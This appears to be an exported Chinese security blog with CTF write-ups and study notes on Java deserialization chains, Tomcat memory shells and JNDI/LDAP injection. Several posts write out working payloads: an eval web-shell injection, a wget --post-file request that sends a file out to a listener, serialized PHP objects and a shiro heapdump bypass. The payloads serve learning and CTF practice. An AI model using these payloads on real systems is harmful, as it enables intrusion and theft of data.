加密规则为key的md5结果前十位a:4:{i:0;s:19:”tempdir/index.latte”;i:1;s:6:”版本号”;i:2;a:7:{i:0;s:5:”clamp”;i:1;s:11:”divisibleBy”;i:2;s:4:”even”;i:3;s:5:”first”;i:4;s:4:”last”;i:5;s:3:”odd”;i:6;s:5:”slice”;}i:3;b:1;}所以生成缓存文件名为index.latte–key加密结果.php之后在尝试2.10.4的时候有了结果，文件名为index.latte–6f26bb0dba.php回到题目，构造一个传文件html 先发包 提示上传成功之后访问/tempdir/index.latte–6f26bb0dba.php​ DASCTF{a3cb921465600f49b52b9ac907a38edb} 灏妹的web扫就完事了，访问/.idea/dataSources.xmlDASCTF{09957769e7c24dddefc1ef615539c9ac} EasyTp有个file参数，直接读/etc/passwd提示harcker，伪协议读源码 有个反序列化，要绕parse绕过方法///public/index.php/index/unser?vulvul=绕过之后网上找条链子就行 payload DASCTF{ee6db14d381babe4f78be657ee473cba}"},{"title":"java Filter内存马","date":"2021-11-21T01:14:04.000Z","url":"/2021/11/21/java%20Filter%E5%86%85%E5%AD%98%E9%A9%AC/","categories":[["java","/categories/java/"]],"content":"java Filter内存马去补了点之前javaweb的知识回来看内存马 Tomcat内存马主要利用了Tomcat的部分组件会在内存中长期驻留的特性，只要将我们的恶意组件注入其中，就可以一直生效，直到容器重启。 javaweb三大组件Servlet 在Java web b/s架构中，servlet扮演了重要的角色，作为一个中转处理的容器，他连接了客户端和服务器端的信息交互和处理。简单来说，客户端发送请求，传递到servlet容器，而servlet将数据转换成服务器端可以处理的数据再发送给服务器端，再数据处理之后，再传递到servlet容器，servlet再转译到客户端，完成了一次客户端和服务器端的信息交互。 Servlet是通过Java编写的，因为他也具备了Java的一些特点，比如跨平台性，可扩展性高，然而他的优点不仅仅是局限于语言方面，因为Servlet的出现，可以使我们将JSP页面中的一些JAVA代码移植到Servlet中来，可无疑使前端人员深受喜欢，方便了项目的修改完善，而Servlet的使用也是非常的简单。 Servlet的生命周期有四个阶段，第一个阶段，实例化，会调用构造方法，第二个阶段是初始化，会调用init（）方法，第三个阶段是请求处理，调用service方法，第四个阶段，服务终止也就是销毁阶段，调用destroy方法。 前台如何将数据传递给Servlet？也是非常简单的，只需表单提交就可以轻松完成，Servlet可以使用request.getParameter来接受，传递给前台就可以使用request.setA什么的来赋值。 页面提交的时候有get和post两种方式，这俩种方式都会在Servlet中处理，如果是get则会调用doget，post则会dopost，而同时使用，只需要post调用doget方法就可以。 Filter filter用于拦截用户请求，在服务器作出响应前，可以在拦截后修改request和response，这样实现很多开发者想得到的功能。 filter是一个可以复用的代码片段，可以用来转换HTTP请求、响应和头信息。Filter不像Servlet，它不能产生一个请求或者响应，它只是修改对某一资源的请求，或者修改从某一的响应。 ListenerJavaweb中的监听器是用于监听web常见对象HttpServletRequest,HttpSession,ServletContext 1.监听web对象创建与销毁. 2.监听web对象的属性变化 3.监听session绑定javaBean操作. 内存马随着攻防对抗的博弈愈发激烈，流量分析、EDR等专业安全设备被防守方广泛使用，传统的文件上传的webshll或以文件形式驻留的后门越来越容易被检测到，webshell终于进入内存马时代。 内存马主要分为以下几类： servlet-api类 filter型 servlet型 spring类 拦截器 controller型 Java Instrumentation类 agent型 Filter内存马POC FIlter流程注册一个Servlet之后自定义一个Filter 在web.xml里注册filter 启动tomcat是可以看到 访问/demo 调试一下tomcat是如何调用我们自定义的Filter的 有几个关键的类 FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息 FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息 FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter WebXml：存放 web.xml 中内容的类 ContextConfig：Web应用的上下文配置类 StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet 在org.apache.catalina.startup.ContextConfig这个类的configureContext方法里面解析了web.xml 来到StandardWrapperValve类里面，这里初始化了一个filterChain 进入createFilterChain方法。 这里先获取web应用context，再从中获取filterMap[]，里面能就能看到我们定义的filter的信息了 下面遍历了filterMaps进入if语句，里面有两个方法matchDispatcher和matchFiltersURL，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 相匹配，则会进入findFilterConfig方法 ![image-20211130143455233](/Users/fmyyy/Library/Application Support/typora-user-images/image-20211130143455233.png) 从findFilterConfig方法获取配置返回FilterConfig 如果不为null，则把filterConfig加入filterChain 看addFilter 逻辑很简单，遍历已有的filter判断当前filter是否已经存在，如果不存在则加入。 回到StandardWrapperValve类下面调用了doFilter， ![image-20211130145103086](/Users/fmyyy/Library/Application Support/typora-user-images/image-20211130145103086.png) 跟进这个doFilter 调用了internalDofilter internalDofilter里面调用getFilter获取filter之后下面调用其doFilter方法，所以来到了我们自定义的doFilter方法里面。 内存马注入我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell 入手点再组装过滤链的部分 在createFilterChain方法里面生成过context即StandardContext类，就是一个web应用 所以要想办法获取这个context，获取这个context的方法有很多，想之后再单独记一篇笔记。 获取到context之后能看到三个重要的属性 前面贴过了这三个属性的作用，再放一遍 FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息 FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息 FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern 大致流程如下： 创建一个恶意 Filter 利用 FilterDef 对 Filter 进行一个封装 将 FilterDef 添加到 FilterDefs 和 FilterConfig 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发） 每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启 所以最后就形成了POC。"},{"title":"jdk7u21反序列化","date":"2021-11-19T01:14:04.000Z","url":"/2021/11/19/jdk7u21/","categories":[["java","/categories/java/"]],"content":"jdk7u21反序列化前置知识都已经知道，只有一个AnnotationInvocationHandler类之前学CC链的时候用到过，记不太清了，先重新学 AnnotationInvocationHandler 这次利用的是invoke里面的equalsImpl 先进getMemberMethods 通过反射获取了this.type的所有方法，之后进入下面for循环进行调用。所以肯定会调用到TemplatesImpl类的getOutputProperties() 或者newTransformer() 从而加载字节码。 jdk7u21yso里给的调用链 开头是LinkedHashSet的readObject,调用的是其父类HashSet的readObject方法。 写个poc 下个断点调试一下 在readObject里经过一些验证来到put，这里的map此时应该为HashMap 参数为TemplatesImpl 在该readObjcet中会将反序列化的对象put()放入map中（HashSet本质是HashMap），先添加templates再添加proxy。在put()第二次添加proxy的时候，map中已经有了一个TemplatesImpl 第二次put 之后来到这里 这里是一个关键的地方，我们要触发key.equals，这个key为我们的代理对象，所以会触发AnnotationInvocationHandler的invoke。 但前提得满足两个条件 e.hash == hash 为true (k = e.key) == key 为false 特殊的”f5a5a608”e.hash是在生成payload的时候set.add(proxy)计算的 在java.util.HashMap#put添加键值的时候会经过hash函数计算对象hash 而key此时是proxy动态代理对象，要调用它的hashCode()函数需要走动态代理的invoke接口，当调用方法名为hashCode时，会进入hashCodeImpl() 这个方法遍历memberValues这个map对象，然后做了 memberValueHashCode()直接返回var0.hashCode()，也就是直接返回原本对象的hashcode，但是还要走一次亦或，所以要让127 * (key).hashCode()=0，而key为f5a5a608，他的hashcode刚好为0 所以触发了key.equals(k)进入之前的AnnotationInvocationHandler里的equalsImpl。"},{"title":"LADP+JNDI注入","date":"2021-11-18T01:14:04.000Z","url":"/2021/11/18/JNDI+LADP/","categories":[["java","/categories/java/"]],"content":"LADP+JNDI注入除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。 LADPLDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol） LADP主要能储存以下java对象 Java serializable objects Referenceable objects and JNDI References Objects with attributes (DirContext) RMI (Java Remote Method Invocation) objects (including those that use IIOP) CORBA objects 我们主要就是利用的第二点Reference对象，这在之前也学过。 marshalsecmarshalsec是一个可以快速搭建一个恶意的rmi或者ldap server的工具。 测试写一个客户端 用marshalsec搭建ladp服务 编译好的弹计算器的恶意类放web根目录，之后运行客户端 ladp服务也输出了相关信息 这篇我主要是熟悉一下工具的使用，熟悉之后遇到题目不至于不会用工具。"},{"title":"java fastjson基础","date":"2021-11-16T09:14:04.000Z","url":"/2021/11/16/fastjson%E5%9F%BA%E7%A1%80/","categories":[["java","/categories/java/"]],"content":"java fastjson基础fastjson简介Fastjson是阿里巴巴公司开源的速度最快的Json和对象转换工具,一个Java语言编写的JSON处理器。 它采用一种“假定有序快速匹配”的算法，是号称Java中最快的json库。 常见的序列化操作 简单的使用1.将Json文本数据信息转换为JsonObject对象,通过K V的形式获取值 JSONObject的get方法是通过传入的key值匹配返回val的值 2.将JSON文本转换成实体类 先定义一个User类 有两个方法可以进行反序列化，一个是parseObject、一个是parse，先来看看parseObject parseObject 结果 很明显 根据参数的不同，返回的类也不同。 parse这个方法貌似用到的不多,不细说了。 toJSONString "},{"title":"java JNDI","date":"2021-11-16T01:14:04.000Z","url":"/2021/11/16/JNDI%E6%B3%A8%E5%85%A5/","categories":[["java","/categories/java/"]],"content":"JNDI定义JNDI(Java Naming and Directory Interface)，是SUN公司提供的一种标准的Java命名系统接口。为 开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。 现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。 看这篇文章了解一下RMI工厂模式  JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接⼝。我们的应⽤可以 通过JNDI的API去访问相关服务提供的接⼝。 我们要使⽤JNDI，必须要有服务提供⽅，我们常⽤的就是JDBC驱动提供数据库连接服务，然后我们配置 JNDI连接 JDK也为我们提供了⼀些服务接⼝： LDAP （Lightweight Directory Access Protocol） 轻量级⽬录访问协议 CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务 RMI（Java Remote Method Invocation）JAVA远程远程⽅法调⽤注册 DNS（Domain Name Service）域名服务 漏洞中涉及到最多的就是 RMI ， LDAP 两种服务接⼝ JNDI注入在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。 恶意服务 返回了一个Reference对象，指向 恶意类 编译后放入根目录 客户端受害者 将编译好的Exploit.class放入根目录，运行服务端之后运行客户端 结果 还有个JNDI+LDAP注入，之后记"},{"title":"java RMI基础","date":"2021-11-14T13:14:04.000Z","url":"/2021/11/14/RMI%E5%9F%BA%E7%A1%80/","categories":[["java","/categories/java/"]],"content":"RMI学习继续补之前的笔记 RMI是什么RMI（Remote Method Invocation），远程方法调用。实际上就是在一个java虚拟机上调用另一个java虚拟机的对象上的方法。 RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。（我们可以再之后数据包中看到该协议特征） 在RMI中对象是通过序列化方式进行编码传输的。 RMI分为三个主体部分： Client-客户端：客户端调用服务端的方法 Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。 Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。 总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样。 唯一区别就是RMI服务端提供的方法，被调用的时候该方法是执行在服务端。 实例还是从实例下手吧 先写一个接口 这个接口需要 使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系） 同时需要继承Remote接口 接口的方法需要生命java.rmi.RemoteException报错 服务端实现这个远程接口 这个实现类需要 实现远程接口 继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上。（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。） 构造函数需要抛出一个RemoteException错误 实现类中使用的对象必须都可序列化，即都继承java.io.Serializable 注册远程对象 之后是客户端 运行Server之后运行Client RMI反序列化利用P神在java安全漫谈里用wireshark详细演示了通讯细节，实际上通讯过程也算是序列化和反序列化的过程，中间调用了readObject和writeObject。 若RMI服务端存在readObject反序列化点。从通讯过程可知，服务端会对客户端的任意输入进行反序列化。 Commons-collection利用rmi调用的例子。 前提： 服务端具有以下特点 jdk版本1.7 使用具有漏洞的Commons-Collections3.1组件 RMI提供的数据有Object类型（因为攻击payload就是Object类型） 服务端 客户端 "},{"title":"2021湖湘杯web部分wp","date":"2021-11-14T12:05:04.000Z","url":"/2021/11/14/2021%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"前言快期末了这学期准备退役了，下学期继续努力（大二课怎么这么多啊！！！期末考怎么办啊！！！一节课没听啊！！！） 今天上线看看题 easywill这题没啥好说，跟tp3的rce差不多直接 就能文件包含，之后找不到flag，用拟态的的那个包含pearcmd.php就能getshell Pentest in Autumn下个pom.xml附件 看到shiro spring和shiro，shiro版本有点高，没法直接打。 有个actuator泄露 找到这篇博客  下到heapdump就能弄到秘钥，文章里也给了处理脚本 直接访问无法下载，用shiro未授权 /;/actuator/heapdump 成功下载 用文章里的工具找到秘钥，并脚本处理 拿到key就好办了，之后就是cb1的shiro链子配合spring的通用回显即可 Client.java 获得字节码的类：（spring通用回显） 运行client.java payload如下图打shiro "},{"title":"java动态代理","date":"2021-11-11T12:15:04.000Z","url":"/2021/11/11/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","categories":[["java","/categories/java/"]],"content":"java动态代理记一下之前没记的笔记 代理模式代理模式是常用的java设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。简单的说就是，我们在访问实际对象时，是通过代理对象来访问的，代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。 静态代理静态代理：由程序员创建或特定工具自动生成源代码，也就是在编译时就已经将接口，被代理类，代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。 定义一个Person接口，一个hello方法 一个被代理的类，实现Person接口 一个StaticProxy类 同样实现Person接口，内部还有一个RealPerson类，而且同样实现了Person接口，可以使用RealPerson的hello方法 实例测试 代理模式最主要的就是有一个公共接口（Person），一个具体的类（RealPreson），一个代理类（StaticProxy）,代理类持有具体类的实例，代为执行具体类实例方法。上面说到，代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。这里的间接性就是指不直接调用实际对象的方法，那么我们在代理过程中就可以加上一些其他用途。就这个例子来说，在执行hello方法前想输出日志之类的消息，通过代理模式很轻松就能办到： 动态代理 代理类在程序运行时创建的代理方式被成为动态代理。 我们上面静态代理的例子中，代理类(StaticProxy)是自己定义好的，在程序运行之前就已经编译完成。然而动态代理，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。 创建动态代理类会使用到java.lang.reflect.Proxy类和java.lang.reflect.InvocationHandler接口。java.lang.reflect.Proxy主要用于生成动态代理类Class、创建代理类实例，该类实现了java.io.Serializable接口。 实例： hello接口 被代理类，实现hello接口 一个handler实现InvocationHandler接口 动态代理实现 结果 同样的道理 我们可以再加上一个被代理类 结果： 不同的被代理类传入相应的类构造器即可"},{"title":"java反序列化 rome链以及陇原战疫的java题","date":"2021-11-09T12:14:04.000Z","url":"/2021/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rome%E9%93%BE%E4%BB%A5%E5%8F%8A%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB%E7%9A%84java%E9%A2%98/","categories":[["java","/categories/java/"]],"content":"java反序列化 rome链以及陇原战疫的java题陇原战役遇到一道java题，里面有rome依赖，比赛的时候一搜发现是有现成的链子。 参考  RomeROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。 ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。 关键类ObjectBean和ToStringBean类和EqualsBean类 起点是hashmap的readObject，终点是在ToStringBean的toString方法 但最后的利用点事这样的 不可控.invoke(可控,NO_PARAMS)` 需要加载字节码来rce，这个之后说 链子调用链 起点就是经典的hashmap调用任意类的hashcode方法。 看看ObjectBean类的hashcode() 可以调用equalsBean的beanHashCode()方法，跟进看看 这里又可以调用ObjectBean的toString() 继续跟 就来到终点了，ToStringBean的toString 但该类有两个toString ，一个无参一个有参，这里调用的无参。 之后无参调用有参 至于这个prefix的赋值及ToStringBean的_obj属性，看一下两个类的构造函数就知道 到最后rce的地方了 因为这个invoke的第二个参数是空的，所以需要tmpl加载字节码来rce。 这里有一个判断 满足这个if才能进入invoke，前面的调用有点复杂，用参考文章的话来说就是 有参toString方法会调用 BeanIntrospector.getPropertyDescriptors() 来获取 _beanClass 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 _obj 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。 回顾tmpl调用字节码的过程 起点是getOutputProperties() 是个无参方法，所以链子通了。 写个exp 陇原战疫原题 有个rome依赖 有个黑名单 不能用HashMap和BadAttributeValueExpException，rome链本就用不到BadAttributeValueExpException，HashMap只是为了其readObject里调用hashcode，换成Hashtable即可。 当时题目不出网，因为spring框架，用spring通用回显。 exp： 但这题其实实际上后面有调用toString 所以exp应该还能简化，比赛时直接用了整条链子，能打通，不管了"},{"title":"陇原战疫web部分wp","date":"2021-11-08T02:14:04.000Z","url":"/2021/11/08/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%ABweb-wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"webCheckIN下载源码，看到这里 这里调用wget，并且参数可控，可以直接外带数据，查看绑定路由 尝试访问/wget?argv=1 这里应该是出题人失误，无需登录可直接访问，利用–post-file参数直接外带文件 payload /wget?argv=fmyyy&amp;argv=--post-file&amp;argv=/flag&amp;argv= 服务器开个监听直接打就行 eaaasyphp反序列化，有个file_put_content可以写文件，本地能打通但是题目写不进去，估计没有写的权限，看phpinfo的hint payload ?code=O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3Bs%3A7%3A%22phpinfo%22%3B%7D 看到有fpm服务，file_put_contents可控，尝试ftp被动模式打fpm 网上找个ftp恶意服务器 生成payload的脚本 生成的payload(弹shell没成功，尝试curl外带数据) 放到恶意ftp服务器即可 vps运行ftp服务器 poc生成： poc EasyJaba反编译一下 不能用HashMap和BadAttributeValueExpException这两个，有remo的依赖 map换成Hashtable就行了 evil.class用spring通用回显的就行了，用下面这个文章里的就行了  "},{"title":"2021东华杯一道java题","date":"2021-11-05T11:52:04.000Z","url":"/2021/11/05/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF%E4%B8%80%E9%81%93java%E9%A2%98/","categories":[["java","/categories/java/"]],"content":"这次东华杯有个个java题，考点还挺有意思的。 看index控制器 有个很明显的readObject() pom.xml是空的，所以要试原生类或者题目给的类。 题目里给了个ToStringBean类。 在toString方法里有个defineClass用于加载动态字节码。 所以要找一个原生类在其readObject方法调用了toString方法。 CC5的链子里就有这样的类。 CC5的重点就是BadAttributeValueExpException这个类，看看他的readObject方法做了什么。 只放一点重要的源码 在下面看的到调用了valObj属性的toString方法。并且valObj是上面get方法获得的，说明其可控。 写exp 字节码的恶意类 服务器开个监听直接打 "},{"title":"长城杯线下赛赛后复现","date":"2021-10-13T04:10:04.000Z","url":"/2021/10/13/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"长城杯线下赛赛后复现前言去打了长城杯决赛，结果全程坐牢，果然不联网的web太难了，赛后拿到了两个web靶机的wp，复现一下。 fancyapi目录结构 逻辑很简单，web用的是python的flask框架，然后go写了几个接口处理数据。 看看backend.go 关键就在这里，action要==readFlag，secret==token，这个token的值是在数据库里的，再看 这里是可以造成sql注入的，注出token即可，但有个过滤，比赛时没有绕过去。。。然后基本上都在想办绕过这个过滤了。。 在app.py处 /search路由的提交的数据传入go接口进行数据库查询，也就是上面sql注入的地方，提交方式为json。 vote参数为整数型，关键在name参数处有个isalnum。 绕过方法为多参数，但我比赛的时候尝试了多参数但是没有绕过去。后来拿到了wp，在本地简单复现一下。 搭建一个简单的app.py 因为isalnum的过滤只能提交字母和数字，如图 上面说了多参数，我只想到覆盖，看了wp用的是[]绕过 附上一张比赛时的原图（不是我做的） 这之后还有个过滤 要传入action=”readFlag”但这里对readFlag有过滤 readFlag没法绕，这里是对路由进行绕过，这里判断当请求路径为/flag时才进行下面的判断，所以 %66lag?action=readFlag即可 比赛时觉得无解，现在看来学到了很多，还是太菜了 work一道java题，比赛的时候知道了大致的思路，但没有做出来，赛后复现一下。 主办方后来给了jar包。所以本地复现比较容易。 直接看后台操作 主要是这里。 这里jdbc参数全可控，搭建恶意mysql服务器读文件即可 但在做这个操作前需要登陆admin 看注册这里 如果按照常规的json格式提交，不管什么username都会被替换成hacker 例如 &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125; 注册成功，看看表里注册进了什么数据。 所以要绕过正则，这个正则很简单，用大小写或者畸形json数据即可，这里去掉双引号变成 &#123;username:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125; 可以看到注册成功了。登陆 /login?data=&#123;username:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125; 登陆成功后来到admin。 先起恶意mysql服务器。 脚本地址  启动脚本访问  读到/etc/passwd 之后读flag就行。 这题应该还可以用jdbc反序列化，之后学了再来试试。"},{"title":"java反序列化-改造CC3攻击shiro","date":"2021-10-03T13:14:04.000Z","url":"/2021/10/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%94%B9%E9%80%A0CC3%E6%94%BB%E5%87%BBshiro/","categories":[["java","/categories/java/"]],"content":"java反序列化-改造CC3攻击shiro前言上一篇学了改造CC6，之前学过，CC3链子就是利用TemplatesImpl加载字节码进行反序列化，既然CC6可以改造，那么CC3也可以改造 改造CC3看看原来的CC3 我们要改的仍然是这部分 之前说过，不能有transformers数组，利用LazyMap#get传参的特性构造payload 要改的基本上就只有数组那部分 其余不变。 之后继续学习看看还有没有能够在shiro中使用的链子。"},{"title":"绿城杯-Light1ng WP","date":"2021-10-03T10:34:04.000Z","url":"/2021/10/03/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF%E2%80%94%E2%80%94Light1ng/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"Light1ng战队一、战队信息 名称：Light1ng 排名：16 二、解题情况进不去平台了，没法截图了 三、解题过程Web1.ezphpezphp在关于里看到个Git，所以考虑存在git泄露 index.php里的php代码 由于assert会进行命令执行，且$link_page参数可控，所以此处存在rce 构造闭合： ?link_page=flag.php&#39;, &#39;..&#39;) === true|eval($_POST[&#39;yy&#39;]);// POST传参： 执行成功，蚁剑连接： 在pages目录下拿到flag DASCTF{af5ff99c7f98d528e711acc42fd6b906} 2.Looking for treasure 打开源码 有提示。 下载到源码 审计。 有一处 这里读取了p文件，如果能控制p的值就能实现文件读取。 这个content和req.body肯定是不相同的不用管它 ，所以p的内容最后会在报错信息的content里发出 看看p是怎么来的 config.path给p赋值。所以得想办法控制path的值。 源码里看到 看到这个想到json-schema原型链污染 payload 成功读到了/etc/passwd的内容，猜测flag在根目录，直接读/flag 数据包 DASCTF&#123;5117143e660f592adc982dd96d2c3f17&#125; PWN1.null正常的菜单堆题，off-by-one漏洞，我没可以看见edit和add中都有read_input（）函数，而漏洞点就在这个read_input（）函数中 可以看见a2+1多读了一个字节我们可以利用这个漏洞来改写chunk的大小造成堆块的重叠。 Exp： 2.uaf正常的菜单题 漏洞点在，free后指针没有置0，造成uaf漏洞，直接freechunk泄露libc，打malloc_hook Exp： 3.Greentownnote这个题的漏洞在于dele这个操作，并没将ptr+8置0 在这可以看到有沙箱函数禁用了exevce，只能读取flag 整体逻辑如下，有正常的add，dele，show功能 直接doublefree泄露libc，利用libc中的函数context可以对其进行栈迁移，我们在堆上提前布置好rop，在利用free_hook函数触发，context+53，将栈迁移到我们布置好的rop处，然后利用srop将rip指向syscall，读取flag 完整exp： RE1.easy_re程序不难，丢入OD，进行分析 发现仅仅是单纯的xor加密,这就好办了,只需要把加密数据dump出来，然后在dump回输入内存，即可让他自动解密（取了个巧，算法没看，猜测可能是RC4魔改） 加密数据如上图 Dump过去，程序自动解密即可 2.[warmup]babyvxworksIDA上来就开幕雷击 很明显，这是一个花指令,直接nop掉 手动处理完，类似上图的所有花指令后，直接IDA F5 Helloworld干了个啥，我也不晓得，但是,算法很明显，就是递归异或0x22，并加3，直接写脚本跑 flag: 3.抛石机先搞清程序如何执行成功 很明显，就是要让x&lt;=y-0.001 z&lt;=d-0.001且要满足那4个一元二次方程，因为不论是v1,v2,v3,v4的取值范围都很小，无限接近于0，不妨设v1=v2=v3=v4=0，然后解这4个一元二次方程(还是在线解吧:)，解得4个值:x1 = 1.08 , x2 = 4.33,x3 = -0.48 , x4 = 1.98，这是4个双浮点数，将他们转为字节 其余3个也是如上图这样转换，然后根据x&lt;=y-0.001 z&lt;=d-0.001，可知x=1.08,y=4.33,d=1.98,z=-0.48 回到开始，这里其实是一个格式的固定，判断是否为flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}格式的flag，并不是照抄,x仅仅代表的是任意字符 全局变量初始化 运算结果，然后进行比较 这里通过动调不难发现规律，输入:13,返回结果就是13，输入ab，返回结果就是AB。 当然这里有个细节得注意，这里仅仅只操作了4个字节，而我们运算的双浮点数是8个字节，很明显不满足我们的条件，所以是算法的问题吗？No，其实后面4个字节，对整体双浮点数的影响微乎其微，所以我们可以舍弃掉，毕竟，他毕竟的是一个范围，而不是一个确切的数字，所以经过计算(我是手工，别骂，flag好像有多组，不知道是不是题的bug):flag{48e17a14-52b8-1e85-b81e-85ebae47e17a} Crypto1.RSA-1易知n,c都是p的倍数,求两者公倍数即可得到p,后面简单求RSA即可 from gmpy2 import * from Crypto.Util.number import * n = 173652311549263483644782768725584927759117606030023943537236034618984057402347150 018201115486009149076170038066524923916867102562741566778871019971756922777296484 560875349876167437246465982344660947795407294135838263551452779804790401570754536 942505723166383481215712187597695337387215068111758669908519728384663075942262938 369341166596852157756432854658953177558927544733320342344957959361836105695710164 005353627626995176867816023020450485321314260352608789798921694410594676235230605 692855705771992363098881558330137219979339604577846532620761355617698387041668103 84309655788983073376941843467117256002645962737847 c = 694496710881543773542894128678411940313831971345573215592505592864653696259767294 180583131213068933801491345208129640027286271044720726509975040165782816583601312 284865683910085471996518868009737549119324912772559966038374682703180306602649798 929885642021625020603506818096379745479215119107143364594624591491673263700711708 519944289449566745554451748340400653660712148067868800042042228138053936851980716 217509976389198864811793777795106989997526019001899583490454144756271830743390659 202122666688563887702030400561445076308133708283860841475616225382569742049350991 4578546951634127502393647068722995363753321912676 p=gcd(n,c) q=n//p phi=(p-1)*(q-1) `e=65537 d=invert(e,phi) M=powmod(c,d,n) m=M//2021//1001//p print(long_to_bytes(m)) flag: 2.Warmup仿射加密,简单逆一下就行 flag: 3.RSA_plus第一部分n1是四个素数的乘积，其中$p和p_1,q和q_1$相近，将n1放入在线网站factordb中分解得到N1和N2，通过开根爆破的方式运行很久都没有出答案，于是可以猜测N1和N2不是由$pp1和qq1$得到，而是$pq1和p1q$得到，假设$p_1=p+p_0;q_1=q+q_0$，通过$(N_1-N_2+p_0q_0)^2+4p_0q_0N_2=(pq_0-p_0q+p_0q_0)^2+4p_0q_0N_2=(pq_0+p_0q+p_0q_0)^2$知，我们可以爆破$p_0,q_0$计算$(N_1-N_2+p_0q_0)^2+4p_0q_0N_2$是否为完全平方数来判断$p_0，q_0$是否为我们所求，这可以用$gmpy2$库里的iroot函数实现。找到$p_0,q_0$后求出p,q,p1,q1，然后通过欧拉函数的积性知$\\varphi(n1)=(p-1)(q-1)(p1-1)(q1-1)$，解出第一部分的flag1。 